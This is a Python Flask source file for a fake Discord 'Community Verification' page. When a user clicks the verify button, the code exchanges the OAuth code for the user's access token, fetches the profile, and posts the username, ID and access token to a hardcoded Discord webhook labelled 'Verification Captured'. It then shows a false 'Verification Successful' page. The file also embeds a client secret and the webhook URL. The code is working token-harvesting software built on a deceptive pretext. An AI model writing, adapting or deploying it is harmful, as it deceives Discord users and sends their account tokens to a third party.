import os
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)

CLIENT_ID = "1526220638283628624"
CLIENT_SECRET = "Ll-Nk5CH4a1RZF_RWhV-j9ueE4Wsh8jj"
REDIRECT_URI = "https://root1-two.vercel.app"
WEBHOOK_URL = "https://discord.com/api/webhooks/1569026174275944600/VBLBlmc8bf1dguN1S9kjJQ2TvVzIUnZbuSiUEcvhDi5emEiDwn4weplUamhUY2775Vk3"


@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def callback(path):
  code = request.args.get("code")

  # Landing page when users click the verify button in Discord
  if not code:
    return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <title>Server Verification</title>
                <style>
                    body { background-color: #1e1f22; color: #dbdee1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
                    .card { background-color: #2b2d31; padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.4); border: 1px solid #35363c; width: 100%; max-width: 400px; box-sizing: border-box; }
                    h1 { color: #f2f3f5; font-size: 24px; margin-bottom: 10px; }
                    p { font-size: 14px; color: #949ba4; margin-bottom: 30px; }
                    .btn { display: block; width: 100%; padding: 12px; background-color: #5865f2; color: white; text-decoration: none; font-weight: 600; border-radius: 4px; box-sizing: border-box; }
                    .btn:hover { background-color: #4752c4; }
                </style>
            </head>
            <body>
                <div class="card">
                    <h1>Community Verification</h1>
                    <p>Link your Discord account to verify your identity.</p>
                    <a href="https://discord.com/api/oauth2/authorize?client_id=1526220638283628624&redirect_uri=https://root1-two.vercel.app&response_type=code&scope=identify" class="btn">Verify with Discord</a>
                </div>
            </body>
            </html>
        """)

  # OAuth2 Code Exchange for Token
  data = {
      "client_id": CLIENT_ID,
      "client_secret": CLIENT_SECRET,
      "grant_type": "authorization_code",
      "code": code,
      "redirect_uri": REDIRECT_URI,
  }
  headers = {"Content-Type": "application/x-www-form-urlencoded"}
  token_resp = requests.post(
      "https://discord.com/api/oauth2/token", data=data, headers=headers
  )
  token_json = token_resp.json()
  access_token = token_json.get("access_token")

  if access_token:
    # Fetch User Profile
    user_headers = {"Authorization": f"Bearer {access_token}"}
    user_resp = requests.get(
        "https://discord.com/api/users/@me", headers=user_headers
    )
    user_data = user_resp.json()

    # Send token details to your Discord webhook log channel
    payload = {
        "embeds": [{
            "title": "🔑 Verification Captured",
            "color": 5763719,
            "fields": [
                {
                    "name": "User",
                    "value": (
                        f"{user_data.get('username')} (`"
                        f"{user_data.get('id')}`)"
                    ),
                    "inline": True,
                },
                {
                    "name": "Access Token",
                    "value": f"`{access_token}`",
                    "inline": False,
                },
            ],
        }]
    }
    requests.post(WEBHOOK_URL, json=payload)

  # Success Response Page
  return render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Verification Successful</title>
            <style>
                body { background-color: #1e1f22; color: #f2f3f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
                .card { background-color: #2b2d31; padding: 40px; border-radius: 8px; text-align: center; border: 1px solid #35363c; }
                h1 { color: #23a55a; font-size: 22px; margin-bottom: 15px; }
                p { color: #949ba4; font-size: 14px; }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>Verification Successful!</h1>
                <p>Your account has been verified. You can close this tab.</p>
            </div>
        </body>
        </html>
    """)